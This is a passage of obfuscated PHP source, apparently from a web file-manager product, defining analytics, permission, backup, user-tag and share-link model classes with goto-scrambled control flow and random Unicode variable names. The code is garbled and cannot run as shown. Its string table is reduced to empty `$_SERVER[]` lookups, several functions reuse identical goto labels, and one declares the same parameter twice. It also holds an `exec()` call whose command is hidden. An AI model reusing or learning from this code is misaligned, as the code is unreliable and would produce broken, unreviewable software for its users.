$Cϡ = false) { goto cӲ֭; dǔ: $E = is_array($E) ? $E : array(); if (is_array($C銜ٴ)) { $C銜ٴ = array_merge($E, $C銜ٴ); return $C߂ ? isset($C銜ٴ[$C߂]) ? $C銜ٴ[$C߂] : null : $C銜ٴ; } $d = $this->filterWhere(array($Cǖ[29] => $B)); goto Dč; cӲ֭: $Cǖ =& $_SERVER[]; $C銜ٴ = $this->cacheGet($B); $E = $this->optionDefault($B); goto dǔ; E: $this->cacheSet($B, $C銜ٴ); $C銜ٴ = array_merge($E, $C銜ٴ); return $C߂ ? $C銜ٴ[$C߂] : $C銜ٴ; goto c䐑; Dč: $C銜ٴ = $this->where($d)->select(); $C銜ٴ = array_to_keyvalue($C銜ٴ, $Cǖ[89], $Cǖ[359]); foreach ($C銜ٴ as $c䪿 => $EĻ) { if ($Cϡ || in_array($c䪿, $this->jsonField)) { $C銜ٴ[$c䪿] = json_decode($EĻ, !0); } } goto E; c䐑: } public function set($CҞ, $eߨ = false, $f = '') { goto CЅ; CЅ: $c =& $_SERVER[]; $this->cacheRemove($f); $cŞ䤠 = array(); goto d; d: $cѩ = is_array($CҞ) ? $CҞ : array($CҞ => $eߨ); foreach ($cѩ as $eۃ => $F) { if (is_array($F)) { $F = json_encode_force($F); } $this->checkLength($F, !1, $this->tableName . $c[4] . $CҞ); $F = self::textEncode($F); $cѩ = array($c[29] => $f, $c[89] => $eۃ, $c[359] => $F); $cŞ䤠[] = $this->filterWhere($cѩ); } if (!$cŞ䤠) { return !0; } goto dԷ; dԷ: return $this->addAll($cŞ䤠, array(), !0); goto EԐ; EԐ: } protected function optionDefault($EĞ = '') { return !1; } public function setDeep($C̩, $f섚 = false, $dՑ = '') { $b˄Ɲ = explode($_SERVER[][91], $C̩); $D = $this->get(); array_set_value($D, $C̩, $f섚); $this->set($b˄Ɲ[0], $D[$b˄Ɲ[0]], $dՑ); } public function remove($a, $a = '') { $F =& $_SERVER[]; $this->cacheRemove($a); $Cɍ = $this->filterWhere(array($F[89] => $a, $F[29] => $a)); if (is_null($a)) { unset($Cɍ[$F[89]]); } return $this->where($Cɍ)->delete(); } public function cacheSet($B®, $Fߺ = false) { return Cache::set($this->cacheKey($B®), $Fߺ); } public function cacheGet($a) { return Cache::get($this->cacheKey($a)); } public function cacheRemove($CҴ) { return Cache::remove($this->cacheKey($CҴ)); } protected function filterWhere($E) { return $E; } protected function cacheKey($BŧΩ) { return $BŧΩ; } } goto dÇ; F: class AnalysisModel extends ModelBaseLight { public function init($EѰĎ) { $Cݍ =& $_SERVER[]; $CĚ = array($Cݍ[535] => array($Cݍ[29] => $Cݍ[2046], $Cݍ[261] => array($Cݍ[210], $Cݍ[719], $Cݍ[2047], $Cݍ[2048])), $Cݍ[2049] => array($Cݍ[29] => $Cݍ[2050], $Cݍ[261] => array($Cݍ[210], $Cݍ[717], $Cݍ[2051], $Cݍ[2052], $Cݍ[2053]))); if (!isset($CĚ[$EѰĎ])) { return !1; } $this->optionType = $CĚ[$EѰĎ][$Cݍ[29]]; $this->field = $CĚ[$EѰĎ][$Cݍ[261]]; return !0; } public function listData($a = false, $eؑ = "\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\145", $B笎 = false) { return parent::listData($a, $eؑ, $B笎); } public function trendList($e) { goto C솎; C솎: $bą鮦 =& $_SERVER[]; $Aث = $this->listData(); if ($Aث) { $B = end($Aث); $EՄɅ = date($bą鮦[2054], strtotime($bą鮦[2055])); if ($B[$bą鮦[210]] == $EՄɅ) { return $Aث; } $b٥ = strtotime($B[$bą鮦[210]]); } goto Bӻ; Bӻ: if (!isset($b٥)) { $Aޗ = $e == $bą鮦[535] ? $bą鮦[477] : $bą鮦[772]; $b٥ = Model($Aޗ)->min($bą鮦[187]); } $e߮ = $bą鮦[2056] . ucfirst($e); $c˞ = $this->dateList($b٥); goto aϒ; aϒ: foreach ($c˞ as $EՄɅ) { $this->{$e߮}($EՄɅ); } return $this->listData(); goto CɄ; CɄ: } private function dateList($b폫) { $C݂ř =& $_SERVER[]; $Fۓޠ = $b폫; $d = strtotime($C݂ř[2055]); $A߈ = array(); while ($Fۓޠ <= $d) { $A߈[] = date($C݂ř[2054], $Fۓޠ); $Fۓޠ = strtotime($C݂ř[2057], $Fۓޠ); } return $A߈; } public function _recordUser($e = '') { goto A؇; c񯍾ٻ: $bҍ = array($b[187] => array($b[942], $E솑݄)); $eȋ = Model($b[477])->where($bҍ)->count($b[1453]); $bҍ[$b[187]] = array($b[321], array($A, $E솑݄)); goto Eڼ͠; c: $Cђ = array($b[210] => $e, $b[719] => (int) $eȋ, $b[2047] => (int) $f, $b[2048] => (int) $A؉); return $this->insert($Cђ); goto c搰ќ; Eڼ͠: $f = Model($b[477])->where($bҍ)->count($b[1453]); $bҍ[$b[29]] = $b[2060]; $A؉ = Model($b[2061])->where($bҍ)->count($b[2062]); goto c; A؇: $b =& $_SERVER[]; $A = strtotime(date($b[2058], strtotime($e))); $E솑݄ = strtotime(date($b[2059], strtotime($e))); goto c񯍾ٻ; c搰ќ: } public function _recordStore($Bĕ = '') { goto E۬ލ; D捐: $d̜[$FΒǰ[371]] = 1; $Eᷟ = Model($FΒǰ[772])->where($d̜)->sum($FΒǰ[77]); $d̜[$FΒǰ[371]] = 2; goto f虓; E۬ލ: $FΒǰ =& $_SERVER[]; $dǉ = strtotime(date($FΒǰ[2059], strtotime($Bĕ))); $d̜ = array($FΒǰ[187] => array($FΒǰ[942], $dǉ)); goto eج; eج: $Fɼ = Model($FΒǰ[422])->where($d̜)->sum($FΒǰ[77]); $d̜[$FΒǰ[370]] = 0; $A = Model($FΒǰ[772])->where($d̜)->sum($FΒǰ[77]); goto D捐; f虓: $E˅ = Model($FΒǰ[772])->where($d̜)->sum($FΒǰ[77]); $fƶ = array($FΒǰ[210] => $Bĕ, $FΒǰ[717] => (int) $A, $FΒǰ[2051] => (int) $Fɼ, $FΒǰ[2052] => (int) $Eᷟ, $FΒǰ[2053] => (int) $E˅); return $this->insert($fƶ); goto d͐̃; d͐̃: } public function trend($AҐ, $a) { goto A歈; E箂: if ($D && $a != $Bӎ[1428]) { $Eǹ = $D[0][$Bӎ[210]]; $FĹɐ = $this->validDate($a, $Eǹ); $C = array(); $E➚ = array_to_keyvalue($D, $Bӎ[210]); foreach ($FĹɐ as $D꺑ї) { if (isset($E➚[$D꺑ї])) { $A¤ = $E➚[$D꺑ї]; } else { $A¤ = end($D); $A¤[$Bӎ[210]] = $D꺑ї; if ($AҐ == $Bӎ[535]) { $A¤[$Bӎ[2047]] = $A¤[$Bӎ[2048]] = 0; } } $C[] = $A¤; } $D = $C; } $Dʯ = array($Bӎ[535] => array($Bӎ[719] => LNG($Bӎ[2063]), $Bӎ[2047] => LNG($Bӎ[2064]), $Bӎ[2048] => LNG($Bӎ[2065])), $Bӎ[2049] => array($Bӎ[717] => LNG($Bӎ[2066]), $Bӎ[2051] => LNG($Bӎ[2067]), $Bӎ[2052] => LNG($Bӎ[2068]), $Bӎ[2053] => LNG($Bӎ[2069]))); $c͸홨 = array($Bӎ[535] => $Bӎ[2070], $Bӎ[2049] => $Bӎ[77]); goto Aʊ; A歈: $Bӎ =& $_SERVER[]; if (!$this->init($AҐ)) { return !1; } $D = $this->trendList($AҐ); goto E箂; f: return $c؃˩; goto E; Aʊ: if (empty($D)) { $D꺑ї = date($Bӎ[2054], strtotime($Bӎ[2055])); $b։ = array($Bӎ[210] => $D꺑ї); foreach ($Dʯ[$AҐ] as $c򍚱 => $fŌ) { $b։[$c򍚱] = 0; } $D[] = $b։; } $c؃˩ = array(); foreach ($D as $fŌ) { if ($AҐ == $Bӎ[2049] && $fŌ[$Bӎ[2051]] > $fŌ[$Bӎ[717]]) { $fŌ[$Bӎ[2051]] = $fŌ[$Bӎ[717]]; } foreach ($Dʯ[$AҐ] as $c򍚱 => $A) { $A¤ = array($Bӎ[210] => $fŌ[$Bӎ[210]], $Bӎ[1359] => $A); $A¤[$c͸홨[$AҐ]] = isset($fŌ[$c򍚱]) ? $fŌ[$c򍚱] : 0; $c؃˩[] = $A¤; } } goto f; E: } public function validDate($F揚, $AЕծÕ) { goto Fٲ; Fٲ: $dڋĤ =& $_SERVER[]; $eц = date($dڋĤ[2054], strtotime($dڋĤ[2055])); $D󌙎Ұ = array($eц); goto fʄ; B󜻙: return $D󌙎Ұ; goto Fر; fʄ: switch ($F揚) { case $dڋĤ[1435]: $cܞل = mktime(0, 0, 0, date($dڋĤ[2071]), date($dڋĤ[2072]) - date($dڋĤ[1242]) + 7 - 7, date($dڋĤ[2073])); $B = 0; do { $bШ = date($dڋĤ[2054], $cܞل - 3600 * 24 * 7 * $B); $D󌙎Ұ[] = $bШ; $B++; } while ($AЕծÕ < $bШ); break; case $dڋĤ[1433]: $B = 1; do { $b󈲻 = date($dڋĤ[2074], strtotime("\x2d\40{$B}\40\155\x6f\x6e\x74\150\x73")); $D󌙎Ұ[] = $b󈲻; $B++; } while ($AЕծÕ < $b󈲻); break; case $dڋĤ[1742]: $A䐔 = (int) date($dڋĤ[2073], strtotime($AЕծÕ)); $dߨ = (int) date($dڋĤ[2073]); if ($A䐔 >= $dߨ) { break; } for ($A䐔; $A䐔 < $dߨ; $A䐔++) { $D󌙎Ұ[] = $A䐔 . $dڋĤ[2075]; } break; default: break; } if ($AЕծÕ > end($D󌙎Ұ)) { array_pop($D󌙎Ұ); } sort($D󌙎Ұ); goto B󜻙; Fر: } public function listTable($C) { $E = ucfirst($C); return Model($E)->listData(); } public function option($a؟) { $AÙ = $_SERVER[][2076] . ucfirst($a؟); return $this->{$AÙ}(); } private function optionUser() { goto Bֈ; e: $B䃶å = strtotime($cőĊ[2078]); $fĕǶƈ = array($cőĊ[2079] => array($cőĊ[943], $B䃶å)); $dŇ = (int) Model($cőĊ[477])->where($fĕǶƈ)->count($cőĊ[1453]); goto c; Bֈ: $cőĊ =& $_SERVER[]; $A = Model($cőĊ[477])->count($cőĊ[1453]); $A = Model($cőĊ[477])->where($cőĊ[2077])->count($cőĊ[1453]); goto e; c: if (!$dŇ) { $dŇ = 1; } $B䃶å = strtotime(date($cőĊ[2058])); $fĕǶƈ = array($cőĊ[2079] => array($cőĊ[943], $B䃶å)); goto Ḑ➐; Ḑ➐: $Bꬬ = Model($cőĊ[477])->where($fĕǶƈ)->count($cőĊ[1453]); return array($cőĊ[714] => (int) $A, $cőĊ[2080] => (int) ($A - $A), $cőĊ[2081] => (int) $A, $cőĊ[2082] => (int) $Bꬬ, $cőĊ[2083] => $dŇ); goto dޘⲓ; dޘⲓ: } private function optionFile() { goto Fܱ; eצ: $F̒ = Model($c˟ğ[772])->where($a֫)->sum($c˟ğ[77]); $fȲ = Model($c˟ğ[772])->where($a֫)->count($c˟ğ[369]); return array($c˟ğ[717] => $f엇, $c˟ğ[2051] => $Eïↇ, $c˟ğ[2084] => $f엇 - $Eïↇ, $c˟ğ[2085] => (int) $F̒, $c˟ğ[719] => (int) $B, $c˟ğ[2086] => (int) $fȲ); goto Cƃ; Fܱ: $c˟ğ =& $_SERVER[]; $cدั = $this->sourceSize(); $f엇 = $cدั[$c˟ğ[77]]; goto E⋰; E⋰: $Eïↇ = $cدั[$c˟ğ[2051]]; $B = Model($c˟ğ[772])->where(array($c˟ğ[370] => 0))->count($c˟ğ[369]); $a֫ = array($c˟ğ[370] => 0, $c˟ğ[187] => array($c˟ğ[943], strtotime(date($c˟ğ[2058])))); goto eצ; Cƃ: } private function optionAccess() { $c֍༈ =& $_SERVER[]; return array($c֍༈[714] => $this->typeLogCnt(), $c֍༈[103] => $this->typeLogCnt($c֍༈[103]), $c֍༈[404] => $this->typeLogCnt($c֍༈[404]), $c֍༈[2087] => $this->typeLogCnt($c֍༈[2087]), $c֍༈[2088] => $this->typeLogCnt($c֍༈[2088]), $c֍༈[535] => $this->typeLogCnt($c֍༈[33], $c֍༈[2062])); } private function typeLogCnt($Cե = '', $b = "\x69\x64") { goto e; F֜Ǥ: $A񜟊 = array($cʙ[187] => array($cʙ[943], $A)); if ($Cե) { $A񜟊[$cʙ[29]] = array($cʙ[7], $a˲Ӱ[$Cե]); } $F㰛 = Model($cʙ[2061])->where($A񜟊)->count($b); goto dº; dº: return (int) $F㰛; goto DÑͶ; e: $cʙ =& $_SERVER[]; $a˲Ӱ = array($cʙ[103] => array($cʙ[2089], $cʙ[2090]), $cʙ[404] => array($cʙ[2091], $cʙ[2092]), $cʙ[2087] => array($cʙ[2093], $cʙ[2094], $cʙ[2095]), $cʙ[2088] => array($cʙ[2096], $cʙ[2097]), $cʙ[2098] => array($cʙ[2099], $cʙ[2100], $cʙ[2101])); $A = strtotime(date($cʙ[2058])); goto F֜Ǥ; DÑͶ: } private function optionServer() { goto DǏ; A: $DϢ = array($Fܽ[763] => $C[$Fܽ[367]]); $FƤ = Model($Fܽ[422])->where($DϢ)->sum($Fܽ[77]); $Fܧ = explode($Fܽ[50], $_SERVER[$Fܽ[139]]); goto cӓ; A: if ($F؅ == $Fܽ[743]) { $Fֳ = explode($Fܽ[1091], $Cҏ[$Fܽ[902]]); $F؅ = $Fֳ[0]; } if ($F؅ == $Fܽ[746] || $F؅ == $Fܽ[747]) { $f׏ = Model()->db()->query($Fܽ[2102]); $DҰ = $f׏[0] && isset($f׏[0][$Fܽ[1358]]) ? $f׏[0][$Fܽ[1358]] : 0; $F؅ = $Fܽ[2103] . ($DҰ ? $Fܽ[8] . $DҰ : $Fܽ[33]); } $Cכ = $GLOBALS[$Fܽ[6]][$Fܽ[337]][$Fܽ[774]]; goto aƆ; aƆ: return array($Fܽ[2104] => $E۴˸ ? $E۴˸[$Fܽ[2105]] : 0, $Fܽ[2106] => $E۴˸ ? $E۴˸[$Fܽ[2107]] : 0, $Fܽ[2108] => (int) $C[$Fܽ[2105]] * 1024 * 1024 * 1024, $Fܽ[2109] => (int) $FƤ, $Fܽ[2110] => ucfirst($D壅), $Fܽ[2111] => $Fܽ[2112] . PHP_VERSION, $Fܽ[2113] => phpBuild64() ? 64 : 32, $Fܽ[713] => str_replace($Fܽ[2114], $Fܽ[919], $F؅), $Fܽ[337] => ucfirst($Cכ), $Fܽ[28] => $_SERVER[$Fܽ[2115]]); goto c󜡡; cӓ: $D壅 = $Fܧ[0]; $Cҏ = $GLOBALS[$Fܽ[6]][$Fܽ[17]]; $F؅ = $Cҏ[$Fܽ[903]]; goto A; DǏ: $Fܽ =& $_SERVER[]; $E۴˸ = $this->diskDriver(); $C = KodIO::defaultDriver(); goto A; c󜡡: } private function diskDriver() { goto f; f: $B =& $_SERVER[]; $A = $B[8]; $A = $GLOBALS[$B[6]][$B[2116]] == $B[2117]; goto Aఙ; Aఙ: if ($A) { $A = $B[2118]; if (function_exists($B[2119])) { exec($B[2120], $b󦃲); $A = $b󦃲[1] . $B[8]; } } if (!file_exists($A)) { return; } $b椧 = @disk_total_space($A); goto b; b: $eݮ = $b椧 - @disk_free_space($A); return array($B[2105] => $b椧, $B[2107] => $eݮ); goto A; A: } public function fileChart($Aǅ˄) { goto f; f: $E򜻍 =& $_SERVER[]; if (isset($Aǅ˄[$E򜻍[1453]])) { return Model($E򜻍[772])->userFileTypeProfile($Aǅ˄[$E򜻍[1453]]); } if (isset($Aǅ˄[$E򜻍[2121]])) { return Model($E򜻍[772])->groupFileTypeProfile($Aǅ˄[$E򜻍[2121]]); } goto AӇ; AӇ: $e眦 = $this->sourceSize(); $Eâ = array($E򜻍[461] => 0, $E򜻍[371] => 1); $Eܯ = Model($E򜻍[772])->where($Eâ)->sum($E򜻍[77]); goto F; F: $Eâ[$E򜻍[371]] = 2; $aʋ = Model($E򜻍[772])->where($Eâ)->sum($E򜻍[77]); return array($E򜻍[717] => $e眦[$E򜻍[77]], $E򜻍[2051] => $e眦[$E򜻍[2051]], $E򜻍[2052] => (int) $Eܯ, $E򜻍[2053] => (int) $aʋ); goto F; F: } private function sourceSize() { $cƄȚ =& $_SERVER[]; $Bڣ = Model($cƄȚ[772])->where(array($cƄȚ[370] => 0))->sum($cƄȚ[77]); $dݮ = Model($cƄȚ[422])->sum($cƄȚ[77]); if ($dݮ > $Bڣ) { $dݮ = $Bڣ; } return array($cƄȚ[77] => (int) $Bڣ, $cƄȚ[2051] => (int) $dݮ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $B㧩զ =& $_SERVER[]; $a = array(array($B㧩զ[386] => LNG($B㧩զ[2122]), $B㧩զ[2123] => $B㧩զ[2124], $B㧩զ[2125] => 6, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($B㧩զ[386] => LNG($B㧩զ[2128]), $B㧩զ[2123] => $B㧩զ[2129], $B㧩զ[2125] => 1, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($B㧩զ[386] => LNG($B㧩զ[2130]), $B㧩զ[2123] => $B㧩զ[2131], $B㧩զ[2125] => 2, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($B㧩զ[386] => LNG($B㧩զ[2132]), $B㧩զ[2123] => $B㧩զ[2131], $B㧩զ[2125] => 3, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($B㧩զ[386] => LNG($B㧩զ[2133]), $B㧩զ[2123] => $B㧩զ[2134], $B㧩զ[2125] => 4, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_VIEW), array($B㧩զ[386] => LNG($B㧩զ[2135]), $B㧩զ[2123] => $B㧩զ[2136], $B㧩զ[2125] => 5, $B㧩զ[2126] => 1, $B㧩զ[2127] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($B㧩զ[386] => LNG($B㧩զ[2137]), $B㧩զ[2123] => $B㧩զ[2138], $B㧩զ[2125] => 7, $B㧩զ[2126] => 1, $B㧩զ[2127] => 0)); return $a; } public static function authCheck($eԥ, $F⠞) { $eԥ = intval($eԥ); if (_get($GLOBALS, $_SERVER[][457])) { return !0; } if ($eԥ <= 0) { return !1; } if (($eԥ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eԥ & $F⠞); } public static function authCheckShow($fɊ) { return self::authCheck($fɊ, self::AUTH_SHOW); } public static function authCheckView($b⾈) { return self::authCheck($b⾈, self::AUTH_VIEW); } public static function authCheckDownload($d䛪鶗) { return self::authCheck($d䛪鶗, self::AUTH_DOWNLOAD); } public static function authCheckUpload($C顮) { return self::authCheck($C顮, self::AUTH_UPLOAD); } public static function authCheckEdit($C֎) { return self::authCheck($C֎, self::AUTH_EDIT); } public static function authCheckRemove($c˟) { return self::authCheck($c˟, self::AUTH_REMOVE); } public static function authCheckShare($C섙) { return self::authCheck($C섙, self::AUTH_SHARE); } public static function authCheckComment($Eݎ) { return self::authCheck($Eݎ, self::AUTH_COMMENT); } public static function authCheckEvent($aꡪ) { return self::authCheck($aꡪ, self::AUTH_EVENT); } public static function authCheckRoot($a) { return self::authCheck($a, self::AUTH_ROOT); } public static function authDisable($D䘟, $FƋ) { if (intval($D䘟) <= 0) { return 0; } return intval($D䘟) & ~$FƋ; } public $optionType = "\123\171\163\164\x65\155\x2e\163\157\165\162\x63\x65\x41\x75\x74\150\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\164\150", "\154\x61\x62\145\x6c", "\144\151\163\x70\x6c\x61\x79", "\x73\171\x73\164\145\155", "\163\x6f\162\x74"); public function initData() { $b򉬛 = $this->authDefault(); foreach ($b򉬛 as $BĚ) { $this->add($BĚ); } } public function listData($Dč = false, $AԺ = "\x73\x6f\162\164", $BǞ = false) { return parent::listData($Dč, $AԺ, $BǞ); } public function update($dؕ, $eؐ) { $Fͷ =& $_SERVER[]; $e = parent::listData($dؕ); $A˥ = $this->findByName($eؐ[$Fͷ[28]]); if (!$e || $A˥ && $A˥[$Fͷ[367]] != $e[$Fͷ[367]]) { return !1; } $this->filterAuth($eؐ[$Fͷ[376]]); return parent::update($dؕ, $eؐ); } public function remove($f袞) { $C䛸 = parent::listData($f袞); if (!$C䛸 || $C䛸[$_SERVER[][1095]]) { return !1; } return parent::remove($f袞); } public function add($a䖥 = array()) { goto f; F: $a䖥 = array_merge($d拾, $a䖥); $a䖥[$b昶[2142]] = $this->getSort(); $this->filterAuth($a䖥[$b昶[376]]); goto aÇݫ; f: $b昶 =& $_SERVER[]; if ($this->findByName($a䖥[$b昶[28]])) { return !1; } $d拾 = array($b昶[28] => $b昶[33], $b昶[376] => 1, $b昶[2139] => $b昶[2140], $b昶[2141] => 1, $b昶[1095] => 0, $b昶[2142] => 0); goto F; aÇݫ: return parent::insert($a䖥); goto AŤ՜; AŤ՜: } private function getSort() { $Cݨ⫝ =& $_SERVER[]; $eԪ = parent::listData(); $bݝƃ = array_to_keyvalue($eԪ, $Cݨ⫝[33], $Cݨ⫝[2142]); return empty($bݝƃ) ? 0 : max($bݝƃ) + 1; } private function filterAuth(&$f) { goto EƲ; EϘ: foreach ($CȦ as $e˼٢) { if ($f & $e˼٢) { $Fڇ[] = $e˼٢; } } if (in_array(self::AUTH_ROOT, $Fڇ)) { $f = array_sum($CȦ); return; } $E = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto cȥ; cȥ: foreach ($Fڇ as $e˼٢) { if (isset($E[$e˼٢])) { $Fڇ = array_merge($Fڇ, $E[$e˼٢]); } } $Fڇ[] = self::AUTH_SHOW; $f = array_sum(array_unique($Fڇ)); goto dˎ; EƲ: if (!$f) { return; } $CȦ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fڇ = array(); goto EϘ; dˎ: } public function sort($D, $A脳) { return parent::update($D, $A脳); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\142\141\143\153\x75\160\x4c\x69\163\x74"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\x73\164\141\164\165\x73", "\143\x6f\156\x74\145\156\164", "\x72\145\x73\165\x6c\164", "\164\151\155\x65\106\x72\x6f\155", "\164\x69\155\x65\x54\x6f"); public function config() { goto C; Búߎ: Action($D[2143])->taskInit(); $B򑵙ڍ = Model($D[2144])->listData(); foreach ($B򑵙ڍ as $f᫩) { if ($f᫩[$D[1095]] == $D[83] && $f᫩[$D[1441]] == $D[2145]) { $b̎ = $f᫩; break; } } goto C̴߅; C: $D =& $_SERVER[]; $fԮ = Model($D[1103])->get($D[733]); $fԮ = json_decode($fԮ, !0); goto C; C̴߅: if (isset($b̎[$D[190]])) { $b̎[$D[190]] = json_decode($b̎[$D[190]], !0); } if (isset($fԮ[$D[190]])) { $b̎[$D[190]][$D[1428]] = $fԮ[$D[190]]; unset($fԮ[$D[190]]); } return array_merge($b̎, $fԮ); goto B; C: $fԮ = is_array($fԮ) ? $fԮ : array(); if (!isset($fԮ[$D[711]])) { $fԮ[$D[711]] = $D[468]; } $b̎ = array(); goto Búߎ; B: } public function listData($aӈ = false, $a窇 = "\155\x6f\x64\151\x66\x79\124\151\155\x65", $a = false) { return parent::listData($aӈ, $a窇, !0); } public function lastItem() { $B­Ά = $this->listData(); return !empty($B­Ά[0]) ? $B­Ά[0] : null; } public function kill($B) { goto B; C: $B퇫 = $d[$b[28]]; $c䘾 = TEMP_FILES . $b[729] . $B퇫 . $b[8]; IO::remove($c䘾, !1); goto B; B: $b =& $_SERVER[]; $d = $this->listData($B); if (!$d || empty($d[$b[28]])) { return !0; } goto cƌ; B: return $this->remove($B); goto Aڱ; cƌ: Task::kill($b[732]); Task::kill($b[748]); Task::kill($b[756]); goto C; Aڱ: } public function remove($fЅ좮) { $eȦ = $this->listData($fЅ좮); if (!$eȦ) { return !0; } return $this->backupRemove($eȦ); } private function backupRemove($A׷) { $e슅 =& $_SERVER[]; parent::remove($A׷[$e슅[367]]); $f̎뢐 = "\173\151\157\x3a{$A׷[$e슅[710]]}\175\57\144\141\x74\x61\142\x61\163\x65\x2f\142\141\143\153\165\160\x5f" . $A׷[$e슅[28]]; IO::remove($f̎뢐, !1); return !0; } public function start() { goto B؝ص; Bŕ: return !0; goto EЩ; C̮ӭ: if (!$FՇ->dbFile()) { return !1; } if ($aƆ[$a[711]] == $a[468]) { $FՇ->file(); } Backup::set(array($a[708] => 1, $a[722] => time())); goto Bŕ; a୰ղ: $FՇ = new Backup(); $FՇ->keep(); if (!$FՇ->db()) { return !1; } goto C̮ӭ; B؝ص: $a =& $_SERVER[]; if ($GLOBALS[$a[6]][$a[84]][$a[2146]] != $a[83]) { return !0; } $aƆ = $this->config(); goto c½ִ; c½ִ: if (!$aƆ || $aƆ[$a[1425]] != $a[83]) { return !1; } $D = $this->process(); foreach ($D as $aԒ) { if ($aԒ) { return Task::restart($aԒ[$a[367]]); } } goto a୰ղ; EЩ: } public function process() { $eó =& $_SERVER[]; return array($eó[713] => Task::get($eó[732]), $eó[716] => Task::get($eó[748]), $eó[167] => Task::get($eó[756])); } public function restore() { $B٤ =& $_SERVER[]; ActionCall($B٤[2147], !0, 1); ActionCall($B٤[2147], !0, 0); } } goto AԴ; E˦: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\x61\147\114\x69\x73\164"; public $modelType = "\125\163\145\x72\x4f\160\164\x69\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\x73\164\x79\x6c\145", "\x73\x6f\162\x74"); public function listData($e֕ = false, $d༢ = "\163\157\x72\x74", $fԳ = false) { return parent::listData($e֕, $d༢, $fԳ); } public function remove($e) { return parent::remove($e); } public function add($E≅, $ḏ = "\154\141\142\x65\x6c\x2d\x67\x72\145\x79\x2d\x6e\x6f\162\x6d\x61\x6c") { $E =& $_SERVER[]; if ($this->findByName($E≅)) { return !1; } $cī = array($E[386] => $E≅, $E[437] => $ḏ, $E[2125] => $this->getSort($E[246]) + 1); return parent::insert($cī); } public function update($C떾, $d䜩) { $f϶ =& $_SERVER[]; $A􎬡 = $this->listData($C떾); $b = $this->findByName($d䜩[$f϶[28]]); if (!$A􎬡 || $b && $b[$f϶[367]] != $A􎬡[$f϶[367]]) { return !1; } return parent::update($C떾, $d䜩); } public function moveTop($d) { $c͹̱ =& $_SERVER[]; $fٓ = parent::listData(); $c = $this->getSort($c͹̱[245]); foreach ($fٓ as &$E) { if ($E[$c͹̱[367]] == $d) { $E[$c͹̱[2142]] = $c; continue; } $E[$c͹̱[2142]] += 1; } return parent::resetData($fٓ); } public function moveBottom($e蟭) { $fˆ =& $_SERVER[]; $a = $this->getSort($fˆ[246]) + 1; return parent::update($e蟭, array($fˆ[2142] => $a)); } public function resetSort($C) { goto dՕ; a뱡: return parent::resetData($ê); goto bƑ; dՕ: $d =& $_SERVER[]; $A撈 = array(); $C = is_array($C) ? $C : array(); goto E; E: for ($Cȍ = 0; $Cȍ < count($C); $Cȍ++) { $A撈[$C[$Cȍ] . $d[33]] = $Cȍ + 1; } $ê = parent::listData(); foreach ($ê as &$bɷ) { $c = $A撈[$bɷ[$d[367]]]; $bɷ[$d[2142]] = $c ? $c : $bɷ[$d[2142]]; } goto a뱡; bƑ: } private function getSort($CΌ) { $CÅ =& $_SERVER[]; $a򎝍 = parent::listData(); $eߐ = array_to_keyvalue($a򎝍, $CÅ[33], $CÅ[2142]); if (!$eߐ) { $eߐ = array(0); } $e׊ʢ = $CΌ == $CÅ[246] ? max($eߐ) : min($eߐ); return intval($e׊ʢ); } } goto a; E뽴: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($b㬂) { $this->pathParse = $b㬂; } protected function infoParse($Dۃ, $FɃ릊 = false) { $c׽ =& $_SERVER[]; return Action($c׽[1033])->sharePathInfo($this->pathParse[$c׽[75]], !0, $FɃ릊); } public function listPath($a各, $bⵏ = false) { $FӔ =& $_SERVER[]; $F = IO::listPath($a各, $bⵏ); foreach ($F as $Bٍ => $bȯ) { if (!in_array($Bٍ, array($FӔ[73], $FӔ[74]))) { continue; } foreach ($bȯ as $C̯ => $Cګ) { $Cګ = Action($FӔ[1149])->parsePathChildren($Cګ, array($FӔ[387] => $a各)); $F[$Bٍ][$C̯] = Action($FӔ[1033])->shareItemInfo($Cګ); } } return $F; } public function listAll($Fǂ) { $a =& $_SERVER[]; $bЋ = IO::listAll($Fǂ); foreach ($bЋ as &$c܍) { $c܍ = array_merge(IO::info($c܍[$a[75]]), $c܍); $c܍[$a[391]] = 